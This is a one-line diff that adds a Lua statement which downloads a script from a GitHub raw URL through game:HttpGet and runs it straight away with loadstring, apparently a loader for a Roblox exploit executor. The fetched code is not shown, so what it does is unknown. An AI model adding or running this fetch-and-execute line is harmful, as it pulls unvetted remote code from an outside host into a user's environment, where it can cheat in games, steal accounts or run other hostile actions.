@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/upd-8-cvr-retro-spam4-ka6s7erniffwmw.lua"))()
